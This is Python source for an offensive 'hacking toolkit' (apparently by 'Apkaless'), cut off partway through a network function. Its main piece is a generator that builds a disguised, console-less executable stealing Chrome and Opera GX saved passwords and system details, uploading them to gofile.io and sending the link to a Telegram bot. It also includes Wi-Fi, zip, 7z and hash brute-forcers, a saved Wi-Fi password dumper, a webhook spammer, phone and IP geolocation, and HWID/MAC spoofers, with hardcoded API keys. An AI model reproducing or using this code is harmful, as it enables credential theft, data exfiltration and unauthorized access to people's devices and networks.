import hashlib
import itertools
import os
import platform
import random
import re
import shutil
import socket
import string
import subprocess
import threading
import time
import webbrowser
from datetime import datetime
from threading import Thread
from zipfile import ZipFile, is_zipfile
import cloudscraper
import folium
import ipinfo
import phonenumbers
import psutil
import py7zr
import pywifi
import pyzipper
import requests
from colorama import Fore
from opencage.geocoder import OpenCageGeocode
from phonenumbers import geocoder, timezone, carrier
from pywifi import const

from pytools.proxy_scraper import SCRAPER
from pytools.pythonic_way_proxy_checker import HttpProxyChecker, Socks4ProxyChecker, Socks5ProxyChecker


def phoneNumberTracker(phoneNumber):
    os.system('cls')
    os.chdir(tool_parent_dir)
    try:

        phone_number_parsed = phonenumbers.parse(phoneNumber)

        print(phone_number_parsed)

        print(
            f'{green}[+] Attempting to track location of:{white} {phonenumbers.format_number(phone_number_parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}...')

        print(f'{green}[+] Time Zone ID:{white} {timezone.time_zones_for_number(phone_number_parsed)}')

        location = geocoder.description_for_number(phone_number_parsed, 'en')

        if location:
            print(f'{green}[+] Region:{white} {location}')
        else:
            print(f'{green}[+] Region:{white} Unknown')

        if carrier.name_for_number(phone_number_parsed, 'en'):
            print(f'{green}[+] Service Provider:{white} {carrier.name_for_number(phone_number_parsed, 'en')}')
        else:
            print(f'{red}[-] Service Provider: Unknown')

        coder = OpenCageGeocode('42c84373c47e490ba410d4132ae64fc4')

        results = coder.geocode(location)

        lat = results[0]['geometry']['lat']
        lng = results[0]['geometry']['lng']
        currency = results[2]['annotations']['currency']['name']
        currency_symbol = results[2]['annotations']['currency']['symbol']
        address = coder.reverse_geocode(lat, lng)

        print(f'{green}[+] Lat:{white} {lat}')
        print(f'{green}[+] Long:{white} {lng}')
        print(f'{green}[+] Currency:{white} {currency}')
        print(f'{green}[+] Currency Symbol:{white} {currency_symbol}')
        if address:
            print(f'{green}[+] Approximate Location is:{white} {address[0]['formatted']}')
        else:
            print(f'{red}[-] No Address Found For The Given Coordinates.')

        my_map = folium.Map(location=[lat, lng], zoom_start=9)

        # Add a marker to the map at the specified latitude and longitude with a popup displaying the 'location' variable.
        folium.Marker([lat, lng], popup=location).add_to(my_map)

        ''' Clean the phone number and use it to generate a file name with an '.html' extension
        we'll basically save each map with the number of the owner for easy identification.'''

        file_name = f"{phoneNumber}.html"

        # Save the map as an HTML file with the generated file name.
        my_map.save(file_name)

        # Print a message indicating where the saved HTML file can be found.
        print(f"{green}[+] See Aerial Coverage at:{white} {os.path.abspath(file_name)}")

    except:
        pass


def webhookSpammer():
    os.system('cls')
    try:

        print(f'{red}[*] Note: {white}if you wanna stop the attack just press {blue}(ctrl + C){rescolor}\n')

        url = input(f'\n{green}[+] WebHook URL:{white} ')

        content = input(f'\n{green}[+] {white}What Do You Like To Send {blue}(ex: Hello):{white} ')

        username = input(f'\n{green}[+] Type Any Name:{white} ')

        data = {
            'content': content,
            'username': username
        }

        os.system('cls')

        while True:

            res = requests.post(url, json=data)

            try:
                res.raise_for_status()

            except requests.exceptions.HTTPError:
                print(f'{green}[+] waiting to unblock your ip...')
                time.sleep(10)

            else:
                print("Payload delivered successfully, code {}.".format(res.status_code))

            time.sleep(0.1)

    except:
        moreOptions()


def wifiPassword():
    os.system('cls')

    all_ssid = []

    res = subprocess.check_output('netsh wlan show profile', shell=True).decode()

    users = res.splitlines()

    for profile in users:

        if 'All User Profile' in profile:
            ssid = profile.strip().split(':')[1].strip()

            all_ssid.append(ssid)

    for ssid in all_ssid:

        res = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', shell=True).decode()

        data = res.strip().splitlines()

        for key in data:

            if 'Key Content' in key:
                print(
                    f'\n{green}[+] SSID:{white} {ssid}\n{green}[+] Password:{white} {key.strip().split(':')[1].strip()}')


def nmapCommands():
    os.system('cls')
    print('''

All You Need To Know About How To Use Nmap To Scan Your Target

By Apkaless

Instagram: Apkaless

====================================================================

================
|Basic Scanning|
================

nmap -F -A --open [target] | -F: Fast Scan, -A: enable OS Detection and Version Scanning, --open: only open ports will be displayed

nmap -iL [filename.txt]

nmap -iR [number of random ip]

nmap [target] --exclude [target]

nmap [target] --excludefile [filename.txt]

nmap --top-ports [number of ports ex: 10] [target]

nmap -PN [target] scan the host even if its down

nmap -sP [target] ping scan, only displays up hosts

=======================================================

===================
|Advanced Scanning|
===================

nmap -sS [target],  syn stealth scan

nmap -sT [target], TCP Scan

nmap -sU [target], UDP Scan

nmap -sX [target], trying to get response from a system being protected by a firewall

nmap -sA [target]

nmap -sO [target], ip protocol scan

nmap --send-eth [target], sends eth packets

nmap --send-ip [target], sends ip packets
''')


def wordlist():
    os.system('cls')
    os.chdir(tool_parent_dir)
    min_len = int(input(f'\n{green}[+] Min Length:{rescolor} '))

    max_len = int(input(f'\n{green}[+] Max Length:{rescolor} '))

    passwords_chars = input(f'\n{green}[+] What are the chars you want (ex: abc1234):{rescolor} ')

    filename = input(f'\n{green}[+] Type The Filename:{rescolor} ')

    gen_password = []

    try:

        os.mkdir('wordlist')
    except:
        pass

    os.chdir('wordlist')

    with open(filename + '.txt', 'a') as f:
        print(f'{yellow}\n[!] Press {white}ctrl + c {yellow}To Stop Generator !')
        try:

            for plen in range(min_len, max_len + 1):

                passwords = itertools.product(passwords_chars, repeat=plen)

                for password in passwords:
                    full_password = ''.join(password)

                    f.writelines([full_password, '\n'])

                    gen_password.append(full_password)
        except:
            pass

        finally:

            wordlistpath = os.path.abspath(filename + '.txt')
            os.system('cls')
            os.chdir(tool_parent_dir)
            print(f'''{blue}
          
|===============|          
|     status    |
|===============|

{green}[+] Min Length:{white} {min_len}
{green}[+] Max Length:{white} {max_len}
{green}[+] Chars Selected:{white} {passwords_chars}
{green}[+] Words Generated:{white} {len(gen_password)}
{green}[+] Wordlist Path:{white} {wordlistpath}
''')


def malware(botToken, cid, malname, malico):
    os.system('cls')
    os.chdir(tool_parent_dir)
    code = r"""
import shutil
import os
import json
import base64
import time
from attr import s
from telebot import TeleBot
import win32crypt
import sqlite3
from Crypto.Cipher import AES
import colorama
import requests
import subprocess

def get_pc_name_and_public_ip():
    
        pc_name = os.getlogin()
    
        ip = subprocess.check_output('curl -s ifconfig.me/ip', shell=True).decode()
    
        cpu = subprocess.check_output('wmic cpu get name', shell=True).decode().strip().split('\n')[1]

        gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().strip().split('\n')[1]
    
        with open('passwords_google_database.txt', 'a') as f:
        
            f.writelines(['*'*50, '\n', f'PC Name: {pc_name}', '\n', f'CPU: {cpu}', '\n', f'GPU: {gpu}', '\n', f'Public IP: {ip}', '\n' , '*'*50, '\n\n'])

            f.close() 
        
def send_email(download_link):
    
    token = '%s'
    
    chat_id = %s
    
    url = f'https://api.telegram.org/bot{token}/SendMessage?chat_id={chat_id}&text={download_link}'
    
    requests.get(url)
    
def upload_file(file):
    
    res = subprocess.check_output('curl -s https://api.gofile.io/getServer', shell=True).decode()
    
    jsdata = json.loads(res)
    
    server = jsdata['data']
    
    server = server['server']
    
    res = subprocess.check_output(f'curl -s -F file=@{file} https://{server}.gofile.io/uploadFile', shell=True).decode()
    
    jsdata = json.loads(res)
    
    download_link = jsdata['data']['downloadPage']
    
    send_email(download_link)

class Chrome:
    
    def __init__(self) -> None:
        pass
    
    def get_encrypt_key(self):
    
        local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'))
    
    
        with open(local, 'r') as f:
        
            jsdata = json.loads(f.read())
        
    
        return jsdata['os_crypt']['encrypted_key']


    def decode_encrypted_key(self, encrypted_key):
    
        return base64.b64decode(encrypted_key)


    def decrypt_decoded_key(self, decoded_key):
        
        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]

    def decrypt_saved_password(self, password, key):
    
        try:

            iv = password[3:15]
        
            password = password[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return


class Opera:
        
    def __init__(self) -> None:
        pass
    
    def get_encrypt_key(self):
    
        local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Local State'))
    
    
        with open(local, 'r') as f:
        
            jsdata = json.loads(f.read())
        
    
        return jsdata['os_crypt']['encrypted_key']


    def decode_encrypted_key(self, encrypted_key):
    
        return base64.b64decode(encrypted_key)


    def decrypt_decoded_key(self, decoded_key):
        
        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]

    def decrypt_saved_password(self, password, key):
    
        try:

            iv = password[3:15]
        
            password = password[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return
            
def chrome():
    
    try:
        
        chrome = Chrome()
    
        encrypted_key = chrome.get_encrypt_key()

        decoded_key = chrome.decode_encrypted_key(encrypted_key)[5:]

        decrypted_key = chrome.decrypt_decoded_key(decoded_key)

        db = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'))

        filename = 'ChromeData.db'
    
        shutil.copyfile(db, filename)
    
        database = sqlite3.connect(filename)
    
        if database:
    

            cursor = database.cursor()
        
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        
            for row in cursor.fetchall():
                print('='*40)
            
                origin_url = row[0]
                action_url = row[1]
                user_or_email = row[2]
                password = row[3]
                password = chrome.decrypt_saved_password(password, decrypted_key)
            
                print('*'*50)
            
                result =f'''
    {colorama.Fore.GREEN}[!] Browser: {colorama.Fore.RESET}Google Chrome
    {colorama.Fore.GREEN}[+] Origin Url: {colorama.Fore.RESET}{origin_url}
    {colorama.Fore.GREEN}[+] Action Url: {colorama.Fore.RESET}{action_url}
    {colorama.Fore.GREEN}[+] Username: {colorama.Fore.RESET}{user_or_email}
    {colorama.Fore.GREEN}[+] Password: {colorama.Fore.RESET}{password}
                        '''
            
                print(result)
                print('*'*50)
            
                with open('passwords_google_database.txt', 'a') as f:
                    f.writelines([f'[+] Browser: Google Chrome\n[+] Origin Url: {origin_url}', '\n', f'[+] Action Url: {action_url}', '\n', f'[+] Username: {user_or_email}', '\n', f'[+] Password: {password}', '\n','='*40, '\n\n'])
              
        database.close()           
        os.remove('ChromeData.db')
        
    except:
        pass
    
def opera():
    
    try:
        
        opera = Opera()
    
        encrypted_key = opera.get_encrypt_key()

        decoded_key = opera.decode_encrypted_key(encrypted_key)[5:]

        decrypted_key = opera.decrypt_decoded_key(decoded_key)

        db = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Login Data'))

        filename = 'OperaData.db'
    
        shutil.copyfile(db, filename)
    
        database = sqlite3.connect(filename)
    
        if database:
    

            cursor = database.cursor()
        
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        
            for row in cursor.fetchall():
                print('='*40)
            
                origin_url = row[0]
                action_url = row[1]
                user_or_email = row[2]
                password = row[3]
                password = opera.decrypt_saved_password(password, decrypted_key)
            
                print('*'*50)
            
                result =f'''
    {colorama.Fore.GREEN}[!] Browser: {colorama.Fore.RESET}Opera GX
    {colorama.Fore.GREEN}[+] Origin Url: {colorama.Fore.RESET}{origin_url}
    {colorama.Fore.GREEN}[+] Action Url: {colorama.Fore.RESET}{action_url}
    {colorama.Fore.GREEN}[+] Username: {colorama.Fore.RESET}{user_or_email}
    {colorama.Fore.GREEN}[+] Password: {colorama.Fore.RESET}{password}
                        '''
            
                print(result)
                print('*'*50)
            
                with open('passwords_google_database.txt', 'a') as f:
                    f.writelines([f'[+] Browser: Opera GX\n[+] Origin Url: {origin_url}', '\n', f'[+] Action Url: {action_url}', '\n', f'[+] Username: {user_or_email}', '\n', f'[+] Password: {password}', '\n','='*40, '\n\n'])
              
        database.close()           
        os.remove('OperaData.db')
    except:
        pass
    
def main():
    
    print('\n================= Chrome =================\n\n')
    
    chrome()
    
    print('\n================= Opera =================\n\n')
    opera()

if __name__ == '__main__':

    userprofile = os.path.join(os.environ['USERPROFILE'])
    os.chdir(userprofile)
    colorama.init(convert=True)
    get_pc_name_and_public_ip()
    main()
    upload_file('passwords_google_database.txt')
    os.remove('passwords_google_database.txt')

""" % (str(botToken), cid)

    with open(malname + '.py', 'w') as f:
        f.writelines([code])
        f.close()

    py2exe(malname + '.py', malico)


def py2exe(fpath, icpath):
    os.chdir(tool_parent_dir)
    try:

        # loop to check if python installed or not, if not then install it right now and break the loop
        while True:
            os.system('cls')
            # check if python installed
            try:
                subprocess.check_output('python --version', shell=True).decode()

            except:
                # python is not installed, try to install it now with curl

                # launch the magic to install the python
                subprocess.check_output(
                    'curl -s https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe --output python64launcher.exe',
                    shell=True).decode()

                subprocess.check_output('start python64launcher.exe -s')
                time.sleep(3)
                continue

            else:

                break

        # loop to check if pyinstaller installed or not, if not then install it right now and break the loop
        while True:
            os.system('cls')
            # check if pyinstaller installed
            try:
                subprocess.check_output('pyinstaller --version', shell=True).decode()

            except:
                # pyinstaller is not installed, try to install it now with curl

                # launch the magic to install the pyinstaller
                subprocess.check_output('pip install pyinstaller', shell=True).decode()

                time.sleep(3)
                continue

            else:

                break

        # loop to check if pillow installed or not, if not then install it right now and break the loop

        while True:
            os.system('cls')
            # check if pillow installed
            subprocess.check_output('pip install -q pillow', shell=True).decode()

            break

        os.system('cls')

        subprocess.check_output(f'pyinstaller --onefile {fpath} --icon {icpath} --noconsole', shell=True)

    except KeyboardInterrupt:
        moreOptions()

    else:
        os.system('cls')
        print(f'{green}[+] Malware Path:{white} {os.path.abspath(fpath)}')
        split_py = fpath.split('.')[0]
        spec = split_py + '.spec'
        shutil.rmtree('build')
        os.remove(fpath)
        os.remove(spec)


def public_ip():
    os.system('cls')

    ip = subprocess.check_output('curl -s ifconfig.me/ip', shell=True).decode().strip()

    return ip


def sysinfo():
    os.system('cls')

    cpu = subprocess.check_output('wmic cpu get name', shell=True).decode().strip().split('\n')[1]
    gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().strip().split('\n')[
        1]
    memlist = subprocess.check_output('wmic memorychip get devicelocator, manufacturer, speed, DataWidth',
                                      shell=True).decode().strip().split('\n')
    bios = subprocess.check_output('wmic bios get name, Version, SoftwareElementID, SerialNumber, Manufacturer',
                                   shell=True).decode()
    mb = subprocess.check_output('wmic baseboard get Manufacturer, product, Version', shell=True).decode()

    print(f'\n{green}===================> {white}CPU & GPU{green} <===================={white}\n')

    print(f'{green}[+] CPU:{white} ', cpu)

    print(f'\n{green}[+] GPU:{white} ', gpu)

    print(f'\n{green}===================> {white}Memory{green} <===================={white}\n')

    for mem in memlist:
        print(mem)

    print(f'\n{green}===================> {white}BIOS{green} <===================={white}\n')

    print(bios)

    print(f'{green}===================> {white}MotherBoard{green} <===================={white}\n')

    print(mb)


def zipfilecracker(zipf, passwordsList):
    os.system('cls')

    # init zipfile object
    os.chdir(tool_parent_dir)
    if is_zipfile(zipf):

        zf = ZipFile(zipf)

        with open(passwordsList, 'rb') as pwdf:  # open file cotains passwords

            pwdsList = pwdf.readlines()  # read all file lines and store them into list

            for pwd in pwdsList:  # iterate through list

                password = pwd.strip()

                try:

                    zf.extractall(pwd=password)  # try to extract the zipped file with the given password

                except NotImplementedError:  # is the zipped file was encrypted by zipcrypto instead of AES256

                    try:

                        aesf = pyzipper.AESZipFile(zipf)

                        aesf.extractall(pwd=password)

                    except:
                        print(f'\n{red}[-] Password Error:{white} {password.decode()}')


                    else:
                        print(f'\n{green}[+] Password Found:{white} {password.decode()}')
                        break


def ip_lookup(ip):
    os.system('cls')

    latitudeandlatitude = []

    resolve_ip = socket.gethostbyname(ip)

    try:

        accessToken = '58950d8a1c1383'

        handler = ipinfo.getHandler(accessToken)

        details = handler.getDetails(resolve_ip)

        for key, value in details.all.items():

            print(f'{green}[+] {key}:{white} {value}')

            if key == 'latitude' or key == 'longitude':
                latitudeandlatitude.append(value)

    except:
        print(f'\n{red}[-] Invalid IP Address:{white} {resolve_ip}')

    else:

        try:

            print(f'{green}[+] DNS Record: {white}{socket.gethostbyaddr(resolve_ip)[0]}')

        except:
            pass

        latitude, longitude = tuple(latitudeandlatitude)

        ip_geolocation = f'https://www.google.com/maps/search/?api=1&query={latitude},{longitude}'

        webbrowser.open(ip_geolocation)


def hash_cracker(hash, pwds, hash_type):
    os.system('cls')
    supported_hashes = {

        1: hashlib.sha256,
        2: hashlib.sha1,
        3: hashlib.sha224,
        4: hashlib.sha384,
        5: hashlib.sha512,
        6: hashlib.md5
    }

    if hash_type in supported_hashes:

        hash_to_crack = hash
        hashtype = supported_hashes[hash_type]
        hashCaptured = False

        try:

            with open(pwds, 'r') as f:

                pwd = f.readlines()
                for passwd in pwd:

                    testing_hash = hashtype(passwd.encode()).hexdigest()

                    if testing_hash == hash_to_crack:

                        print(f'{green}[+] Hash Has Been Cracked:{white} {passwd}')
                        hashCaptured = True
                        break
                    else:
                        print(f'{yellow}[!] Trying With:{white} {passwd}')
                        continue
                else:
                    print(f'\n{green}[+] {white}Process Has Been Finished')

        except OSError:
            os.system('cls')
            print(f'\n{red}[-] The Passwords List Not Found, Please Make Sure You Have The Correct Path.')

        finally:
            if hashCaptured:
                try:
                    os.chdir(tool_parent_dir)

                    try:
                        os.mkdir('Hash_Cracker')
                    except FileExistsError:
                        os.chdir('Hash_Cracker')
                    else:
                        os.chdir('Hash_Cracker')

                    with open('hash_cracker.txt', 'a') as hashfile:
                        hashfile.writelines([f'Hash: {hash_to_crack}\nCracked Hash: {passwd}', '\n\n'])
                        hashfile.close()

                except Exception as e:
                    print(f'{red}[-] Error Details: {white}{e}')

                else:
                    print(f'\n{green}[+] Hash Saved Into: {white}{os.path.abspath('hash_cracker.txt')}')

            else:
                return False
    else:
        print(f'\n{red}[-] {white}Hash Type Isn\'t Supported !')
        time.sleep(3)


def sevenz_cracker(sevenzfile, passlist):
    os.system('cls')
    if py7zr.is_7zfile(sevenzfile):

        with open(passlist, 'r') as f:

            passwords = f.readlines()

            for password in passwords:

                passwd = password.strip()

                with py7zr.SevenZipFile(file=sevenzfile, password=passwd) as sevenZ:

                    try:

                        sevenZ.extractall()

                    except:
                        print(f'{red}[-] Error Password: {white}{passwd}')
                        continue

                    else:
                        print(f'\n{green}[+] Password Found: {white}{passwd}')
    else:
        print(f'{red}\n[-] The File Is Not a 7z File')
        time.sleep(3)


def get_hwid():
    mac_address = []

    for interface, address in psutil.net_if_addrs().items():

        for addr in address:
            if addr.family == psutil.AF_LINK:
                mac_address.append(addr.address)
    else:
        hostname = socket.gethostname()
        unhashed_hwid = f'{hostname}' + ''.join(mac_address)
        hashed_hwid = hashlib.md5(unhashed_hwid.encode('ascii')).hexdigest()
        return hashed_hwid


def crack_wifi(dictionary):
    os.system('cls')
    with open(dictionary, 'r') as f:

        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        for i in range(5):
            print(f'\r{green}[+] Scanning All Wifi In Range, Waiting {white}({str(4 - i)})', end='')
            time.sleep(1)
        print('\n')
        os.system('cls')
        bssids = iface.scan_results()
        wifi_names_signals = []
        for bssid in bssids:
            wifi_names = (bssid.signal + 100, bssid.ssid)
            wifi_names_signals.append(wifi_names)
        wifi_names_signals = sorted(wifi_names_signals, reverse=True)

        id = 0
        print('-' * 30)
        while id < len(wifi_names_signals):
            print('{:<8d}{:<8d}{}'.format(id, wifi_names_signals[id][0], wifi_names_signals[id][1]))
            id += 1
        print('-' * 30)

        while True:

            wifi_id = int(input(f'\n{yellow}[!] Please Select Wifi You Wanna Crack By ID:{white} '))
            wifi_to_crack = wifi_names_signals[wifi_id][1]
            confirmation = input(
                f'\n{yellow}[!] Is This The Wifi Name {white}{wifi_to_crack} {yellow}You Wanna Crack {white}(Y/N): ')
            confirmation = confirmation.lower()
            if confirmation == 'y' or confirmation == 'yes':
                break
            else:
                continue
        os.system('cls')
        iface.disconnect()

        while iface.status() == 4:
            pass

        print(f'\r{green}[+] Wi-Fi Interface Disconnected', end='')

        for pwd in f:

            pwd = pwd.strip('\n')
            profile = pywifi.Profile()
            profile.ssid = wifi_to_crack
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = pwd
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < 1:

                if iface.status() == 4:
                    print(
                        f'\r{green}[+] Connected To {white}{wifi_to_crack} {green}With Password: [{white}{pwd}{green}] {yellow}    ',
                        end='  ')
                    input(
                        f'{yellow}\n[!] Hit Enter To Save The Password Into {white}{wifi_to_crack}.txt {yellow}and Back To Main Menu')
                    with open(f'{wifi_to_crack}.txt', 'a') as f:
                        f.writelines(['-' * 38, f'\nWi-Fi: {wifi_to_crack}\nPassword: {pwd}\n', '-' * 38])
                        f.close()
                    main()
                else:
                    print(
                        f'\r{yellow}[!] Trying To Connect To {white}{wifi_to_crack} {yellow}With Password: {white}{pwd}      ',
                        end='')


def restart_adapter(adapters):
    for adapter in adapters:
        try:

            disable = subprocess.check_output(f'netsh interface set interface {adapter} admin=disable', shell=True,
                                              text=True, stderr=subprocess.PIPE)
            enable = subprocess.check_output(f'netsh interface set interface {adapter} admin=enable', shell=True,
                                             text=True, stderr=subprocess.PIPE)
            time.sleep(5)
        except Exception as e:
            print(e)
            input('')
    return None


def machineID_spoofer():
    for i in range(3):

        if i == 1:

            letters = string.ascii_letters + string.digits
            machine_id = ''.join(random.choice(letters) for _ in range(8)) + '-' + ''.join(
                random.choice(letters) for _ in range(4)) + '-' + ''.join(random.choice(letters) for _ in range(4)) \
                         + '-' + ''.join(random.choice(letters) for _ in range(4)) + '-' + ''.join(
                random.choice(letters) for _ in range(12))  # 232E5638-1D2C-4105-A38D-41F72B7E86B6

            machine_id = '{%s}' % (machine_id.upper())

            res = subprocess.check_output(
                fr'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SQMClient /v MachineId /t REG_SZ /d {machine_id} /f',
                shell=True, Text=True, stderr=subprocess.PIPE)

        elif i == 2:

            letters = string.ascii_letters + string.digits
            machine_id = ''.join(random.choice(letters) for _ in range(8)) + '-' + ''.join(
                random.choice(letters) for _ in range(4)) + '-' + ''.join(random.choice(letters) for _ in range(4)) \
                         + '-' + ''.join(random.choice(letters) for _ in range(4)) + '-' + ''.join(
                random.choice(letters) for _ in range(12))  # 232E5638-1D2C-4105-A38D-41F72B7E86B6

            res = subprocess.check_output(
                fr'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid /t REG_SZ /d {machine_id} /f',
                shell=True, Text=True, stderr=subprocess.PIPE)

        elif i == 3:

            digits = '0483A'  # 00330-80000-00000-AA808

            machine_id = ''.join(random.choice(digits) for _ in range(5)) + '-' + ''.join(
                random.choice(digits) for _ in range(5)) + '-' + ''.join(random.choice(digits) for _ in range(5)) \
                         + '-' + ''.join(random.choice(digits) for _ in range(5))

            res = subprocess.check_output(
                fr'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion /v ProductId /t REG_SZ /d {machine_id} /f',
                shell=True, Text=True, stderr=subprocess.PIPE)

    return True


def hwid_spoofer():
    connected_interfaces = []

    current_mac_address = {}

    connected_adapters = []

    transports = []

    active_interfaces = []

    letters = 'abcdefghijklmn1234567890'

    new_mac_address = 'DE' + ''.join(random.choice(letters) for _ in range(10))

    new_mac_address = new_mac_address.upper()

    # Grab The Connected Interfaces on this os
    for interface in psutil.net_if_addrs():
        if interface == 'Ethernet0' or interface == 'Ethernet' or interface == 'Wi-Fi':
            address = psutil.net_if_addrs()[interface]
            for addr in address:
                if addr.family == psutil.AF_LINK:  # store mac address of each connected interface
                    current_mac_address[interface] = addr.address

            connected_interfaces.append(interface)

    for conn in connected_interfaces:
        mac_address = current_mac_address[conn]

    result = subprocess.check_output(['getmac'], text=True, stderr=subprocess.PIPE).strip().splitlines()[2:]

    for mac_adress in current_mac_address:
        mac_addr = current_mac_address[mac_adress]
        for adapter in result:
            if mac_addr in adapter:
                connected_adapters.append(adapter.strip())

    for trans in connected_adapters:
        transport = trans.split('_')[1]
        transports.append(transport)

    success = False

    n = 0

    iterate = True

    while iterate:

        try:

            if n >= 10:
                interface = r'HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\00' + str(
                    n)
            else:

                interface = r'HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\000' + str(
                    n)
            query = subprocess.check_output(f'reg query {interface}', text=True, stderr=subprocess.PIPE)

            for trans in transports:
                if trans in query:
                    transports.remove(trans)
                    active_interfaces.append(interface)
            n += 1

        except:
            break

    for active_interface in active_interfaces:
        spoof = subprocess.check_output(f'reg add {active_interface} /v NetworkAddress /d {new_mac_address} /f',
                                        text=True, stderr=subprocess.PIPE)
        if 'The operation completed successfully.' in spoof:
            restart_adapter(connected_interfaces)
            success = True

        else:
            success = False

    return success


def proxy_gen():
    global a, b, new
    from threading import Thread
    os.system('cls')
    os.chdir(tool_parent_dir)
    threads = []
    p1 = Thread(target=SCRAPER.proxy_1)
    p2 = Thread(target=SCRAPER.proxy_2)
    p3 = Thread(target=SCRAPER.proxyScraper)
    p4 = Thread(target=SCRAPER.proxyScraper_2)

    p1.start()
    threads.append(p1)
    time.sleep(1)
    p2.start()
    threads.append(p2)
    time.sleep(1)
    p3.start()
    threads.append(p3)
    time.sleep(3)
    p4.start()
    threads.append(p4)
    time.sleep(4)

    for thread in threads:
        thread.join()

    try:
        proxies = SCRAPER.proxies
        b = len(proxies)
        new = [prx for prx in dict.fromkeys(proxies)]
        a = len(new)
    except:
        pass

    for proxy in new:
        with open('scraped_proxies.txt', 'a') as file:
            file.writelines([proxy, '\n'])
            file.close()
    print(
        f'\n{green}[+] Total Proxies: {white}{b}\n{green}[+]{red} {b - a} Duplicated Proxies {green}Has Been Removed.\n{green}[+] Saved Into: {white}Scraped_proxies.txt')


def proxy_check(prx_list):
    os.system('cls')
    os.chdir(tool_parent_dir)

    def save_working(proxy, type):

        with open(f'{type}.txt', 'a') as f:
            f.writelines([proxy, '\n'])
            f.close()

    def check(proxy):

        http_prx = HttpProxyChecker(proxy, 10).start_checker()
        socks4_prx = Socks4ProxyChecker(proxy, 10).start_checker()
        socks5_prx = Socks5ProxyChecker(proxy, 10).start_checker()

        if http_prx:
            http_proxies.append(proxy)
            save_working(proxy, 'http')
        elif socks4_prx:
            socks4_proxies.append(proxy)
            save_working(proxy, 'socks4')
        elif socks5_prx:
            socks5_proxies.append(proxy)
            save_working(proxy, 'socks5')
        else:
            errors.append(proxy)

    with open(prx_list, 'r') as f:

        proxies = []
        threds = []
        http_proxies = []
        socks4_proxies = []
        socks5_proxies = []
        errors = []

        for prx in f:
            prx = prx.strip('\n')
            proxies.append(prx)

        for proxy in proxies:
            th = Thread(target=check, args=(proxy,))
            th.start()
            threds.append(th)

            print(
                f'\r{green}Http({len(http_proxies)}) :: {cyan}Socks4({len(socks4_proxies)}) :: {lmagenta}Socks5({len(socks5_proxies)}) :: {red}Errors({len(errors)})',
                end='   ')


def network_optimization():
    mac_addresses = []
    ips = []

    def cls():

        os.system('cls')

        return True

    def find_mac_address_of_current_adapter():

        for iface, address in psutil.net_if_addrs().items():
            for addr in address:
                if addr.family.AF_LINK == psutil.AF_LINK:
                    mac_address = addr.address
                    mac_addresses.append(mac_address)
                elif addr.family == 2:
                    ips.append(addr.address)

        return mac_addresses[0], ips[0]

    def find_adapter_registry_key(tr_name):

        res = subprocess.check_output(
            r'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}',
            shell=True)

        devices = re.findall(r'HKEY_LOCAL_MACHINE\\.+', res.decode().strip())

        for device in devices[1:]:

            res = subprocess.check_output(f'reg query {device}', shell=True).decode().strip()

            if tr_name in res:
                return device

    def get_transport_name(mac_address):
        cls()
        res = subprocess.check_output('getmac', shell=True).decode().strip()
        res = res.strip().split('\n')
        for i in res:
            if mac_address in i:
                return i

    def find_high_value(device):

        res = subprocess.check_output(fr'reg query {device}\Ndi\params\*SpeedDuplex\enum', shell=True)

        decoded_res = res.decode().strip()

        key = re.search(r'HKEY_LOCAL_MACHINE\\.+', decoded_res).group()

        clean_res = decoded_res.strip(key)

        final_res = clean_res.strip()

        return re.findall(r'\d+', final_res)

    def change_device_properties(device: str, spd: str):

        res = subprocess.check_output(
            fr'reg add {device} /v *SpeedDuplex /t REG_SZ /d {spd} /f && reg add {device} /v *TCPChecksumOffloadIPv4 /t REG_SZ /d 3 /f && reg add {device} /v *TCPChecksumOffloadIPv6 /t REG_SZ /d 3 /f && reg add {device} /v *UDPChecksumOffloadIPv4 /t REG_SZ /d 3 /f && reg add {device} /v *UDPChecksumOffloadIPv6 /t REG_SZ /d 3 /f && reg add {device} /v WolShutdownLinkSpeed /t REG_SZ /d 2 /f',
            shell=True).decode()
        cls()
        if 'The operation completed successfully.' in res:
            print(f'''\n{lmagenta}[!] The Following Properties Has Been Changed:
                  
        {green}Maximum  Speed  Set To ==> {white}True
        {green}Shutdown Speed  Set To ==> {white}False
